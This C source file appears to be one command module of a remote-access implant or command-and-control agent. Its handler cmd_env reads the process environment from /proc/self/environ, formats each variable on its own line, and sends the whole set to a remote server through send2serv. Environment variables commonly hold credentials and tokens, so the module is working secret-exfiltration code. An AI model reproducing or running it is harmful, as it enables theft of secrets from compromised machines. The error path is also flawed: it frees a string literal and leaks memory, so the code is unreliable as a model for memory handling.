#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <time.h>
#include <liburing.h>
#include "functions/send/send2serv.h"
#include "functions/read_file/read_file.h"


void cmd_env(request_t *req, int sockfd, const char *uuid, const char *arg) { //arg is unused. Just a dummy place holder. 
    // size_t buffer_size;
    char *output_buffer = read_file(req->ring, "/proc/self/environ");
    if (output_buffer == NULL) {
        char error_msg[256];
        snprintf(error_msg, sizeof(error_msg), "Unable to read environmental variables at /proc/self/environ...\n");
        send2serv(req, uuid, error_msg, strlen(error_msg));
        return;
    }

    char *current_ptr = output_buffer;
    char *final_string = strdup("");

    // Special handling to make each environmental variable on a new line. 
    while (*current_ptr) {
        size_t current_len = strlen(current_ptr);
        size_t new_size = strlen(final_string) + current_len + 2;

        char *tmp = realloc(final_string, new_size);
        if (tmp == NULL) {
            final_string = "ERROR: Failed to reallocate memory";
            break;
        }
        final_string = tmp;
        strcat(final_string, current_ptr);
        strcat(final_string, "\n");
        current_ptr += strlen(current_ptr) + 1;
    }

    send2serv(req, uuid, final_string, strlen(final_string));
    free(output_buffer);
    free(final_string);
}